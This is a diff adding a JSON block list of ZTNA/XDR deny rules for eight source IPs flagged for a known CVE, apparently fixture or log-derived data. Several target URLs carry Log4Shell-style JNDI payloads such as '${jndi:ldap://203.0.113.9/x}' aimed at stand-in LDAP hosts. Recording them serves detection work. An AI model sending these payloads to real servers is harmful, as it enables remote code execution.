@@ -1,0 +1,101 @@
+{
+  "schema": "aleph.ztna.blocked-rules.v1",
+  "rules": [
+    {
+      "ruleId": "xdr.block.knowncve.kc-01",
+      "alertId": "kc-01",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "203.0.113.10",
+      "targetUrl": null,
+      "pattern": "jndi_header_injection",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    },
+    {
+      "ruleId": "xdr.block.knowncve.kc-02",
+      "alertId": "kc-02",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "203.0.113.10",
+      "targetUrl": "/search?q=${jndi:ldap://203.0.113.9/x}",
+      "pattern": "jndi_parameter_injection",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    },
+    {
+      "ruleId": "xdr.block.knowncve.kc-03",
+      "alertId": "kc-03",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "198.51.100.16",
+      "targetUrl": "/login?next=${jndi:ldap://198.51.100.9/x}",
+      "pattern": "jndi_parameter_injection",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    },
+    {
+      "ruleId": "xdr.block.knowncve.kc-04",
+      "alertId": "kc-04",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "192.0.2.16",
+      "targetUrl": null,
+      "pattern": "jndi_header_injection",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    },
+    {
+      "ruleId": "xdr.block.knowncve.kc-05",
+      "alertId": "kc-05",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "203.0.113.24",
+      "targetUrl": "/health?probe=${jndi:ldap://203.0.113.9/x}",
+      "pattern": "vulnerability_scanner_and_exploit_probing",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    },
+    {
+      "ruleId": "xdr.block.knowncve.kc-06",
+      "alertId": "kc-06",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "198.51.100.24",
+      "targetUrl": "/api/notes?q=${jndi:ldap://198.51.100.9/x}",
+      "pattern": "jndi_parameter_injection",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    },
+    {
+      "ruleId": "xdr.block.knowncve.kc-07",
+      "alertId": "kc-07",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "192.0.2.24",
+      "targetUrl": "/login",
+      "pattern": "jndi_header_injection",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    },
+    {
+      "ruleId": "xdr.block.knowncve.kc-08",
+      "alertId": "kc-08",
+      "action": "deny",
+      "reasonCode": "xdr_known_cve_detected",
+      "ip": "203.0.113.31",
+      "targetUrl": "/search?q=${jndi:ldap://203.0.113.9/x}",
+      "pattern": "jndi_header_injection",
+      "confidence": 0.95,
+      "createdAt": "2026-10-15T01:31:31.131Z",
+      "expiresAt": "2026-10-15T02:31:31.131Z"
+    }
+  ]
+}
